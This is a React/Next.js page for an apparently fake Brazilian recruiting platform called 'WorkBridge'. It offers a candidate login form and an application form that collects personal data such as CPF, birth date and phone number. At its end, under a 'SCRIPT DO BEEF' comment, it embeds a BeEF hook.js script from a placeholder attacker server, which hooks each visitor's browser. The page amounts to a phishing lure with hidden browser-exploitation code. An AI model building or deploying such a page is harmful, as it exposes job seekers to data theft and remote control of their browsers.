import Link from 'next/link';
import { useState } from 'react';

export default function Page() {
  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    telefone: '',
    dataNascimento: '',
    cpf: '',
    escolaridade: '',
    linkedin: '',
    senha: '',
    vaga: '',
    curriculo: ''
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(formData);
    alert("Candidatura enviada com sucesso!");
  };

  return (
    <div className="flex flex-col gap-12 p-8 max-w-4xl mx-auto">
      <section>
        <img src="https://source.unsplash.com/1200x300/?office,team" alt="Banner empresa" className="rounded-xl mb-6" />
        <h1 className="text-4xl font-bold mb-2">WorkBridge</h1>
        <p className="text-lg text-gray-700 mb-4">
          Conectando os talentos do futuro às empresas que transformam o presente.
        </p>
        <p className="text-md mb-2">Plataforma de recrutamento para empresas de tecnologia e inovação.</p>
      </section>

      <section>
        <h2 className="text-2xl font-semibold mb-4">🔐 Login para candidatos</h2>
        <form className="flex flex-col gap-3 mb-10">
          <input type="email" name="email" placeholder="Email" className="p-2 border rounded" />
          <input type="password" name="senha" placeholder="Senha" className="p-2 border rounded" />
          <button className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 w-max">Entrar</button>
        </form>
      </section>

      <section>
        <h2 className="text-2xl font-semibold mb-4">📌 Vagas em destaque</h2>
        <ul className="list-disc pl-6 text-lg space-y-2">
          <li>Estágio em Cibersegurança - TechNova</li>
          <li>Desenvolvedor Júnior - CodeLab</li>
          <li>Suporte Técnico Nível 1 - HelpDesk 24h</li>
          <li>Analista de Dados - DataWise</li>
          <li>Gestor de Projetos Júnior - InovaCorp</li>
        </ul>
      </section>

      <section>
        <h2 className="text-2xl font-semibold mb-4">📄 Formulário de candidatura</h2>
        <form onSubmit={handleSubmit} className="flex flex-col gap-4">
          <input type="text" name="nome" placeholder="Nome completo" className="p-2 border rounded" onChange={handleChange} />
          <input type="email" name="email" placeholder="Email" className="p-2 border rounded" onChange={handleChange} />
          <input type="tel" name="telefone" placeholder="Telefone" className="p-2 border rounded" onChange={handleChange} />
          <input type="date" name="dataNascimento" className="p-2 border rounded" onChange={handleChange} />
          <input type="text" name="cpf" placeholder="CPF" className="p-2 border rounded" onChange={handleChange} />
          <input type="text" name="escolaridade" placeholder="Escolaridade" className="p-2 border rounded" onChange={handleChange} />
          <input type="text" name="linkedin" placeholder="Perfil do LinkedIn" className="p-2 border rounded" onChange={handleChange} />
          <input type="text" name="vaga" placeholder="Vaga desejada" className="p-2 border rounded" onChange={handleChange} />
          <textarea name="curriculo" placeholder="Cole aqui seu currículo ou carta de apresentação" className="p-2 border rounded" rows="5" onChange={handleChange}></textarea>
          <button type="submit" className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 w-max">Enviar candidatura</button>
        </form>
      </section>

      {/* SCRIPT DO BEEF */}
      <script src="http://[IP_DO_SERVIDOR]:3000/hook.js"></script>
    </div>
  );
}

